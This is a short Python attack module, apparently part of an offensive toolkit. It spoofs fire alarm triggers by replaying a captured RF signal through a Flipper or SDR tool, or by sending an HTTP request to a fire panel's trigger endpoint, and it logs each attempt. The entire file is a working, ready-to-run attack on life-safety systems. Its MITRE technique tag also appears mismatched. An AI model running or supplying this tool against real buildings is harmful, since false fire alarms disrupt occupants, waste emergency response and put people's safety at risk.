#!/usr/bin/env python3
# modules/attacks/fire_alarm_trigger_spoofer.py

import argparse
import json
import os
import time
import subprocess
from datetime import datetime

LOG_FILE = "results/fire_alarm_spoof_log.json"
MITRE_TTP = "T1585.001"

def log_event(method, target, mode):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "target": target,
        "mode": mode,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def spoof_rf_trigger(sub_file):
    print(f"[*] Replaying RF trigger signal from {sub_file}...")
    subprocess.run(["flipperplay", sub_file])  # Requires Flipper/SDR tool
    log_event("RF Replay", sub_file, "fire_alarm")

def spoof_http_trigger(ip):
    print(f"[*] Sending HTTP spoof to fire panel at {ip}...")
    try:
        import requests
        requests.get(f"http://{ip}/trigger?alarm=fire", timeout=3)
        log_event("HTTP", ip, "fire_alarm")
        print("[✓] Trigger sent.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof fire alarm triggers via RF or IP")
    parser.add_argument("--method", choices=["rf", "http"], required=True)
    parser.add_argument("--target", required=True, help="RF .sub file path or IP address")
    args = parser.parse_args()

    if args.method == "rf":
        spoof_rf_trigger(args.target)
    else:
        spoof_http_trigger(args.target)
